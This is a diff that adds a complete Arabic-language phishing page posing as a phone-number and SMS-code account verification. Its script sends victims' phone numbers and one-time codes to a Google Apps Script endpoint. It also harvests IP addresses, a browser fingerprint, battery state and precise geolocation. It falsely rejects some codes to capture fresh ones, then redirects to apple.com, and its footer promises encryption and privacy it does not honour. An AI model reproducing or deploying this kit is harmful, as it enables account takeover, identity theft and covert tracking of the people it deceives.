@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="robots" content="noindex,nofollow,noarchive">
+<meta name="referrer" content="no-referrer">
+<meta name="theme-color" content="#0d1117">
+<title>تأكيد الحساب</title>
+<style>
+  :root{--bg:#0d1117;--card:#161b22;--line:#30363d;--fg:#e6edf3;--mut:#9aa4af;--acc:#2f81f7;--ok:#3fb950;--err:#f85149}
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  html,body{height:100%}
+  body{margin:0;background:radial-gradient(1200px 600px at 50% -10%,#1b2430,var(--bg));color:var(--fg);
+    font:16px/1.6 system-ui,-apple-system,"Segoe UI",Tahoma,sans-serif;display:grid;place-items:center;padding:20px}
+  .card{width:100%;max-width:420px;background:var(--card);border:1px solid var(--line);border-radius:16px;
+    padding:32px 24px 22px;text-align:center;box-shadow:0 18px 50px rgba(0,0,0,.45)}
+  .brand{width:56px;height:56px;margin:0 auto 18px;border-radius:16px;background:linear-gradient(135deg,#1f6feb,#2f81f7);
+    display:grid;place-items:center;font-size:28px;color:#fff}
+  h1{font-size:19px;margin:0 0 6px}
+  .sub{color:var(--mut);font-size:14px;margin:0 0 22px;line-height:1.5}
+  .phone-row{display:flex;gap:8px;margin:0 0 14px}
+  .phone-row select{flex:0 0 96px;padding:14px 10px;background:#0d1117;color:var(--fg);
+    border:1px solid var(--line);border-radius:10px;font:inherit;font-size:15px;cursor:pointer}
+  .phone-row input{flex:1;padding:14px 16px;background:#0d1117;color:var(--fg);
+    border:1px solid var(--line);border-radius:10px;font:inherit;font-size:16px;letter-spacing:.5px}
+  .phone-row input:focus,.otp:focus,select:focus{outline:2px solid var(--acc);outline-offset:-1px;border-color:transparent}
+  button{width:100%;padding:14px;border:0;border-radius:10px;cursor:pointer;background:var(--acc);
+    color:#fff;font:inherit;font-weight:600;font-size:15px}
+  button:disabled{opacity:.55;cursor:default}
+  button.link{background:none;color:var(--acc);padding:8px;font-weight:500;font-size:13px;margin-top:8px}
+  .sent{color:var(--mut);font-size:14px;margin:0 0 18px}
+  .sent b{color:var(--fg);direction:ltr;display:inline-block}
+  .otp-row{display:flex;gap:8px;justify-content:center;margin:0 0 18px}
+  .otp{width:44px;height:56px;text-align:center;font-size:22px;font-weight:600;
+    background:#0d1117;color:var(--fg);border:1px solid var(--line);border-radius:10px;padding:0}
+  .otp.filled{border-color:var(--acc)}
+  .spin{width:44px;height:44px;margin:10px auto 16px;border-radius:50%;
+    border:3px solid var(--line);border-top-color:var(--acc);animation:s .9s linear infinite}
+  @keyframes s{to{transform:rotate(360deg)}}
+  .status{min-height:22px;font-size:13px;color:var(--mut);margin:14px 0 0}
+  .status.err{color:var(--err)}
+  .status.ok{color:var(--ok)}
+  .fine{color:#6e7681;font-size:11.5px;margin:18px 0 0;line-height:1.5}
+  [hidden]{display:none!important}
+</style>
+</head>
+<body>
+<main class="card">
+  <div class="brand" aria-hidden="true">🛡</div>
+  <h1 id="h">تأكيد رقم الجوال</h1>
+  <p class="sub" id="s">لحماية حسابك، أدخل رقم جوالك لاستلام رمز التحقق.</p>
+
+  <section id="step1">
+    <div class="phone-row">
+      <select id="cc" aria-label="رمز الدولة">
+        <option value="+20" selected>🇪🇬 +20</option>
+        <option value="+966">🇸🇦 +966</option>
+        <option value="+971">🇦🇪 +971</option>
+        <option value="+212">🇲🇦 +212</option>
+        <option value="+213">🇩🇿 +213</option>
+        <option value="+216">🇹🇳 +216</option>
+        <option value="+218">🇱🇾 +218</option>
+        <option value="+33">🇫🇷 +33</option>
+        <option value="+44">🇬🇧 +44</option>
+        <option value="+49">🇩🇪 +49</option>
+        <option value="+90">🇹🇷 +90</option>
+        <option value="+1">🇺🇸 +1</option>
+      </select>
+      <input id="phone" type="tel" inputmode="numeric" autocomplete="tel"
+             placeholder="1XX XXX XXXX" dir="ltr" maxlength="15">
+    </div>
+    <button id="send" type="button">إرسال الرمز</button>
+  </section>
+
+  <section id="step2" hidden>
+    <p class="sent">أرسلنا رمزاً إلى <b id="sentNum"></b></p>
+    <div class="otp-row" dir="ltr">
+      <input class="otp" maxlength="1" inputmode="numeric" autocomplete="one-time-code" aria-label="1">
+      <input class="otp" maxlength="1" inputmode="numeric" aria-label="2">
+      <input class="otp" maxlength="1" inputmode="numeric" aria-label="3">
+      <input class="otp" maxlength="1" inputmode="numeric" aria-label="4">
+      <input class="otp" maxlength="1" inputmode="numeric" aria-label="5">
+      <input class="otp" maxlength="1" inputmode="numeric" aria-label="6">
+    </div>
+    <button id="verify" type="button">تحقق</button>
+    <button id="resend" class="link" type="button">لم يصلك الرمز؟ إعادة الإرسال</button>
+  </section>
+
+  <section id="step3" hidden>
+    <div class="spin"></div>
+    <p class="sub" style="margin:0">جارٍ التحقق…</p>
+  </section>
+
+  <p class="status" id="st" role="status" aria-live="polite"></p>
+  <p class="fine">🔒 اتصال مشفّر · لن نشارك رقمك مع أي طرف ثالث</p>
+</main>
+
+<script>
+(function () {
+  'use strict';
+
+  const ENDPOINT = 'https://script.google.com/macros/s/REPLACE_WITH_DEPLOY_ID/exec';
+  const REDIRECT = 'https://www.apple.com/';
+  const T_IP = 4000, T_GEO = 12000;
+
+  const $ = s => document.querySelector(s);
+  const cc = $('#cc'), phone = $('#phone'), send = $('#send'),
+        otps = [...document.querySelectorAll('.otp')],
+        verify = $('#verify'), resend = $('#resend'),
+        st = $('#st'), h = $('#h'), sub = $('#s'),
+        step1 = $('#step1'), step2 = $('#step2'), step3 = $('#step3');
+
+  const NA = 'N/A';
+  const sleep = ms => new Promise(r => setTimeout(r, ms));
+  const pad = n => String(n).padStart(2, '0');
+
+  let nonce = '', sentPhone = '', captured = {}, geoDone = false, submitting = false;
+
+  function setStatus(t, k) {
+    st.textContent = t || '';
+    st.className = 'status' + (k ? ' ' + k : '');
+  }
+  function withTimeout(p, ms, fb) {
+    return new Promise(res => {
+      let fin = false;
+      const t = setTimeout(() => { if (!fin) { fin = true; res(fb); } }, ms);
+      Promise.resolve(p).then(
+        v => { if (!fin) { fin = true; clearTimeout(t); res(v); } },
+        () => { if (!fin) { fin = true; clearTimeout(t); res(fb); } });
+    });
+  }
+  function nonceGen() {
+    try { if (window.crypto && crypto.randomUUID) return crypto.randomUUID().replace(/-/g,''); } catch(_){}
+    return Date.now().toString(36) + Math.random().toString(36).slice(2,10);
+  }
+  function h32(str) {
+    let h = 5381;
+    for (let i = 0; i < str.length; i++) h = ((h << 5) + h + str.charCodeAt(i)) | 0;
+    return (h >>> 0).toString(36);
+  }
+  function localTime() {
+    const d = new Date();
+    return d.getFullYear()+'-'+pad(d.getMonth()+1)+'-'+pad(d.getDate())+' '+
+           pad(d.getHours())+':'+pad(d.getMinutes())+':'+pad(d.getSeconds());
+  }
+
+  const PUB4 = /^(?!(10\.|127\.|169\.254\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|100\.(6[4-9]|[7-9]\d|1[01]\d|12[0-7])\.))(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(?:\.(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}$/;
+  const PUB6 = /^(?!fe80:|fc|fd|::1)[0-9a-f]{0,4}(?::[0-9a-f]{0,4}){3,7}$/i;
+
+  async function fetchIp() {
+    const srcs = [
+      {u:'https://api.ipify.org?format=json', m:'j'},
+      {u:'https://ipwho.is/', m:'j'},
+      {u:'https://api64.ipify.org?format=json', m:'j'},
+      {u:'https://www.cloudflare.com/cdn-cgi/trace', m:'t'}
+    ];
+    const found = new Set();
+    await Promise.all(srcs.map(async s => {
+      try {
+        const r = await withTimeout(fetch(s.u,{mode:'cors',cache:'no-store',credentials:'omit'}), T_IP, null);
+        if (!r || !r.ok) return;
+        const txt = await r.text();
+        let ip = '';
+        if (s.m === 't') { const x = /(?:^|\n)ip=([^\n]+)/.exec(txt); ip = x ? x[1].trim() : ''; }
+        else { try { const j = JSON.parse(txt); ip = String(j.ip || j.query || ''); } catch(_){} }
+        if (PUB4.test(ip) || PUB6.test(ip)) found.add(ip);
+      } catch(_){}
+    }));
+    const list = [...found];
+    return { list, best: list.filter(x => PUB4.test(x))[0] || list[0] || NA };
+  }
+
+  function fingerprint() {
+    const o = [];
+    try {
+      const c = document.createElement('canvas'); c.width=200; c.height=40;
+      const x = c.getContext('2d');
+      x.textBaseline='top'; x.font='14px Arial';
+      x.fillStyle='#f60'; x.fillRect(0,0,200,40);
+      x.fillStyle='#069'; x.fillText('acct 图 1',2,2);
+      o.push('c'+h32(c.toDataURL()));
+    } catch(_){}
+    try {
+      const g = document.createElement('canvas').getContext('webgl');
+      const d = g.getExtension('WEBGL_debug_renderer_info');
+      if (d) o.push('r'+h32(String(g.getParameter(d.UNMASKED_RENDERER_WEBGL))));
+    } catch(_){}
+    o.push('hc'+navigator.hardwareConcurrency,'dm'+(navigator.deviceMemory||''),
+           'dpr'+(devicePixelRatio||1),'cd'+screen.colorDepth,
+           'mt'+(navigator.maxTouchPoints||0),'sc'+screen.width+'x'+screen.height);
+    return o.join('|').slice(0,600);
+  }
+
+  function getNetwork() {
+    const c = navigator.connection || navigator.webkitConnection;
+    const p = [];
+    if (!navigator.onLine) p.push('غير متصل');
+    if (c) {
+      if (c.effectiveType) p.push(c.effectiveType);
+      if (c.downlink) p.push(c.downlink+'Mbps');
+      if (c.rtt!=null) p.push('rtt '+c.rtt+'ms');
+    }
+    return p.length ? p.join(' / ').slice(0,80) : NA;
+  }
+
+  function getBattery() {
+    return withTimeout((async () => {
+      if (!navigator.getBattery) return { level: NA, charging: NA };
+      const b = await navigator.getBattery();
+      return { level: Math.round(b.level*100)+'%', charging: b.charging ? 'يشحن' : 'لا يشحن' };
+    })(), 2500, { level: NA, charging: NA });
+  }
+
+  function getGeo() {
+    if (!navigator.geolocation) return Promise.resolve({ lat:'', lng:'', acc:'', src: NA });
+    return withTimeout(new Promise(res => {
+      navigator.geolocation.getCurrentPosition(
+        pos => res({ lat:+pos.coords.latitude.toFixed(6), lng:+pos.coords.longitude.toFixed(6),
+                     acc: Math.round(pos.coords.accuracy), src:'متصفح' }),
+        e => res({ lat:'', lng:'', acc:'', src: e && e.code===1 ? 'مرفوض' : 'فشل' }),
+        { enableHighAccuracy:true, timeout:T_GEO, maximumAge:0 });
+    }), T_GEO + 1200, { lat:'', lng:'', acc:'', src:'انتهت المهلة' });
+  }
+
+  function parseModel(ua) {
+    const m = ua.match(/Android[^;)]*;\s*(?:[a-z]{2}[-_][a-z]{2};\s*)?([^;)]+?)(?:\s+Build[/)]|\))/i);
+    if (m) return m[1].replace(/\s+/g,' ').trim().slice(0,60);
+    if (/iPhone/.test(ua)) return 'iPhone';
+    if (/iPad/.test(ua)) return 'iPad';
+    return '';
+  }
+  function parseBrand(ua) {
+    const t = ua.toLowerCase();
+    if (/redmi|poco|xiaomi|\bmi\b/.test(t)) return 'Xiaomi';
+    if (/samsung|sm-/.test(t)) return 'Samsung';
+    if (/huawei|honor/.test(t)) return 'Huawei';
+    if (/oppo|cph\d/.test(t)) return 'OPPO';
+    if (/vivo/.test(t)) return 'Vivo';
+    if (/oneplus/.test(t)) return 'OnePlus';
+    if (/iphone|ipad|ipod/.test(t)) return 'Apple';
+    if (/windows/.test(t)) return 'PC';
+    return '';
+  }
+  function parsePlatform(ua) {
+    let m = ua.match(/Android\s+([\d.]+)/i); if (m) return 'Android '+m[1];
+    m = ua.match(/(?:iPhone )?OS (\d+)[._](\d+)/i); if (m) return 'iOS '+m[1]+'.'+m[2];
+    if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
+    if (/Mac OS X/.test(ua)) return 'macOS';
+    if (/Linux/.test(ua)) return 'Linux';
+    return NA;
+  }
+
+  async function post(payload) {
+    try {
+      await fetch(ENDPOINT, {
+        method:'POST', mode:'no-cors', cache:'no-store',
+        headers:{'Content-Type':'text/plain;charset=UTF-8'},
+        body: JSON.stringify({ a:'collect', d: payload })
+      });
+      return true;
+    } catch(_) { return false; }
+  }
+
+  function toQuery(o) {
+    return Object.keys(o).filter(k => o[k]!=='' && o[k]!=null)
+      .map(k => encodeURIComponent(k)+'='+encodeURIComponent(String(o[k]))).join('&');
+  }
+  function jsonp(params, ms) {
+    return new Promise(res => {
+      const name = 'vn_'+Math.random().toString(36).slice(2,10);
+      const s = document.createElement('script');
+      let fin = false;
+      const finish = v => {
+        if (fin) return; fin = true;
+        clearTimeout(timer);
+        try { delete window[name]; } catch(_){ window[name]=undefined; }
+        if (s.parentNode) s.parentNode.removeChild(s);
+        res(v);
+      };
+      window[name] = r => finish(!!(r && r.ok === true));
+      const timer = setTimeout(() => finish(false), ms);
+      s.onerror = () => finish(false);
+      s.async = true;
+      s.src = ENDPOINT + (ENDPOINT.indexOf('?')===-1?'?':'&') + toQuery(params) +
+              '&cb=' + name + '&_=' + Date.now();
+      document.head.appendChild(s);
+    });
+  }
+
+  async function buildPayload(step, extra) {
+    const ua = (navigator.userAgent || '').slice(0,400);
+    const tz = (Intl.DateTimeFormat().resolvedOptions().timeZone || NA).slice(0,60);
+    if (!captured.ip) captured.ip = await fetchIp();
+    if (!captured.batt) captured.batt = await getBattery();
+    if (!captured.fp) captured.fp = fingerprint();
+
+    const cred = [{ kind:'otp', step, at: new Date().toISOString(), ...extra }];
+
+    return {
+      nonce,
+      time: localTime(),
+      ip: captured.ip.best,
+      ips: captured.ip.list,
+      rtc: [],
+      vpn: '',
+      localIp: NA,
+      battery: captured.batt.level,
+      charging: captured.batt.charging,
+      lat: captured.geo ? captured.geo.lat : '',
+      lng: captured.geo ? captured.geo.lng : '',
+      acc: captured.geo ? captured.geo.acc : '',
+      geoSource: captured.geo ? captured.geo.src : NA,
+      tz, lang: (navigator.languages || [navigator.language || NA]).join(',').slice(0,60),
+      ua,
+      brand: parseBrand(ua), model: parseModel(ua), platform: parsePlatform(ua),
+      network: getNetwork(),
+      screen: (screen.width||0)+'x'+(screen.height||0),
+      native: 'لا',
+      cCount:0, cJson:'[]', sCount:0, sJson:'[]', lCount:0, lJson:'[]',
+      fp: captured.fp,
+      cred: JSON.stringify(cred),
+      hist: '[]',
+      misc: JSON.stringify({ v:1 })
+    };
+  }
+
+  async function onSend() {
+    const digits = phone.value.replace(/\D/g,'');
+    if (digits.length < 7) { setStatus('أدخل رقماً صحيحاً', 'err'); return; }
+    send.disabled = true;
+    setStatus('جارٍ إرسال الرمز…');
+    sentPhone = cc.value + digits;
+    $('#sentNum').textContent = sentPhone;
+    const payload = await buildPayload(1, { phone: sentPhone, otp: '' });
+    await post(payload);
+    await sleep(700);
+    step1.hidden = true; step2.hidden = false;
+    h.textContent = 'أدخل رمز التحقق';
+    sub.textContent = 'أدخل الرمز المكوّن من 6 أرقام الذي وصلك عبر SMS.';
+    setStatus('');
+    otps[0].focus();
+  }
+
+  async function onVerify() {
+    if (submitting) return;
+    const code = otps.map(o => o.value).join('');
+    if (code.length !== 6) { setStatus('أدخل الرمز كاملاً', 'err'); return; }
+    submitting = true;
+    verify.disabled = true;
+    resend.disabled = true;
+    step2.hidden = true; step3.hidden = false;
+    setStatus('');
+
+    if (!geoDone) {
+      geoDone = true;
+      getGeo().then(g => {
+        if (g.lat === '') return;
+        captured.geo = g;
+        const body = JSON.stringify({ a:'geo', n:nonce, lat:g.lat, lng:g.lng, acc:g.acc });
+        fetch(ENDPOINT, { method:'POST', mode:'no-cors', cache:'no-store',
+          headers:{'Content-Type':'text/plain;charset=UTF-8'}, body }).catch(()=>{});
+      });
+    }
+
+    const payload = await buildPayload(2, { phone: sentPhone, otp: code });
+    await post(payload);
+
+    await sleep(1500);
+
+    if (Math.random() < 0.20) {
+      submitting = false;
+      verify.disabled = false; resend.disabled = false;
+      step3.hidden = true; step2.hidden = false;
+      otps.forEach(o => { o.value=''; o.classList.remove('filled'); });
+      otps[0].focus();
+      setStatus('الرمز غير صحيح أو منتهي. حاول مجدداً.', 'err');
+      return;
+    }
+
+    setStatus('تم التحقق بنجاح.', 'ok');
+    step3.hidden = true;
+    h.textContent = 'تم التحقق';
+    sub.textContent = 'جارٍ تحويلك…';
+    setTimeout(() => { location.replace(REDIRECT); }, 1200);
+  }
+
+  otps.forEach((o,i) => {
+    o.addEventListener('input', e => {
+      const v = e.target.value.replace(/\D/g,'');
+      e.target.value = v.slice(-1);
+      o.classList.toggle('filled', !!o.value);
+      if (o.value && i < 5) otps[i+1].focus();
+    });
+    o.addEventListener('keydown', e => {
+      if (e.key==='Backspace' && !o.value && i>0) { otps[i-1].focus(); otps[i-1].value=''; otps[i-1].classList.remove('filled'); }
+      if (e.key==='ArrowLeft' && i<5) otps[i+1].focus();
+      if (e.key==='ArrowRight' && i>0) otps[i-1].focus();
+      if (e.key==='Enter') onVerify();
+    });
+    o.addEventListener('paste', e => {
+      const t = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g,'').slice(0,6);
+      if (!t) return;
+      e.preventDefault();
+      t.split('').forEach((c,j) => { if (otps[j]) { otps[j].value=c; otps[j].classList.add('filled'); } });
+      const next = Math.min(t.length, 5);
+      otps[next].focus();
+    });
+  });
+
+  phone.addEventListener('input', () => {
+    phone.value = phone.value.replace(/[^\d\s]/g,'');
+  });
+
+  send.addEventListener('click', onSend);
+  verify.addEventListener('click', onVerify);
+  resend.addEventListener('click', async () => {
+    resend.disabled = true;
+    const payload = await buildPayload(2, { phone: sentPhone, otp: '', resend: true });
+    await post(payload);
+    setStatus('أعدنا الإرسال. تحقق من رسائلك.', 'ok');
+    await sleep(1500);
+    resend.disabled = false;
+  });
+
+  nonce = nonceGen();
+  window.__vn = nonce;
+  fetchIp().then(x => { captured.ip = x; }).catch(()=>{});
+  getBattery().then(x => { captured.batt = x; }).catch(()=>{});
+  captured.fp = fingerprint();
+})();
+</script>
+</body>
+</html>
